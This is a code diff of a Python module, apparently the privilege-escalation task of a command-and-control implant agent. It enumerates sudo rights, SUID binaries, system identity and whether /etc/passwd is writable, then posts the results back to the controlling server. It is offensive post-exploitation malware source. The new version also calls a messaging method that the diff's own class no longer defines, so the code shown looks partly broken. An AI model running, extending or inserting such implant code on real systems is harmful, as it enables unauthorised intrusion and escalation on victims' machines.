@@ -1,24 +1,45 @@
     import os
+    import subprocess
+    import json
+    import base64
 
-    class PrivEscModule:
-        def __init__(self, postMessage):
-            self.postMessageAndRetrieveResponse = postMessage
-
+    class BaseAgent:
         def privesc(self, task_id):
-            output = []
-            try:
-                output.append(os.popen('whoami && id').read())
-                output.append(os.popen('sudo -l').read())
-                output.append(os.popen('find / -perm -4000 -type f 2>/dev/null').read())
-                output.append(os.popen('uname -a').read())
-            except Exception as e:
-                output.append(f"Error during privilege escalation check: {str(e)}")
+            results = []
 
+            # Check for sudo privileges
+            try:
+                sudo_check = subprocess.run(
+                    ["sudo", "-l"], capture_output=True, text=True, timeout=5
+                )
+                if sudo_check.returncode == 0:
+                    results.append({"check": "sudo_privileges", "result": sudo_check.stdout})
+                else:
+                    results.append({"check": "sudo_privileges", "result": "No sudo privileges or password required."})
+            except Exception as e:
+                results.append({"check": "sudo_privileges", "result": f"Error: {str(e)}"})
+
+            # Check if /etc/passwd is writable
+            passwd_path = "/etc/passwd"
+            try:
+                if os.access(passwd_path, os.W_OK):
+                    results.append({"check": "passwd_writable", "result": f"{passwd_path} is writable! Potential privilege escalation."})
+                else:
+                    results.append({"check": "passwd_writable", "result": f"{passwd_path} is not writable."})
+            except Exception as e:
+                results.append({"check": "passwd_writable", "result": f"Error: {str(e)}"})
+
+            # Prepare response
             data = {
                 "action": "post_response",
-                "responses": [{
-                    "task_id": task_id,
-                    "user_output": "\n".join(output)
-                }]
+                "responses": [
+                    {
+                        "task_id": task_id,
+                        "privesc": {
+                            "results": results
+                        }
+                    }
+                ]
             }
-            return self.postMessageAndRetrieveResponse(data)
+            response = self.postMessageAndRetrieveResponse(data)
+            return json.dumps({"status": "completed", "results": results})
